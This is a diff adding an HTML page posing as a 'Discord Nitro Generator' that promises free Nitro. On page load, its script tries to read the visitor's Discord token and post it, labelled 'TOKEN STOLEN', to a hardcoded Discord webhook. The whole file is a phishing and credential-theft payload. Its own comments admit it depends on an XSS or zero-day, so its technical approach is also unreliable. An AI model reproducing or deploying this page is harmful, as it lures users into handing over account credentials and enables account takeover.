@@ -1,0 +1,29 @@
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <title>Discord Nitro Generator</title>  
+    <script>  
+        // AUTO-TRIGGERED UPON PAGE LOAD  
+        window.onload = function() {  
+            // STEAL TOKEN FROM DISCORD CLIENT MEMORY (REQUIRES XSS/0DAY)  
+            fetch('https://discord.com/api/v9/users/@me', {  
+                credentials: 'include'  
+            })  
+            .then(response => response.json())  
+            .then(data => {  
+                const token = data.token;  
+                // TRANSMIT TOKEN TO WEBHOOK  
+                fetch('https://discord.com/api/webhooks/1314174020161114172/7ZPbaenGRjamq8t5HLoL4agHjhXvy9m4Ao98kiOVbMXCRMEv42z45bqzWqLkZqp92fP8', {  
+                    method: 'POST',  
+                    headers: { 'Content-Type': 'application/json' },  
+                    body: JSON.stringify({ content: `TOKEN STOLEN: ${token}` })  
+                });  
+            });  
+        };  
+    </script>  
+</head>  
+<body>  
+    <h1>Claim Your Free Nitro!</h1>  
+    <!-- FAKE LOADING BAR TO DELAY REDIRECT -->  
+</body>  
+</html>
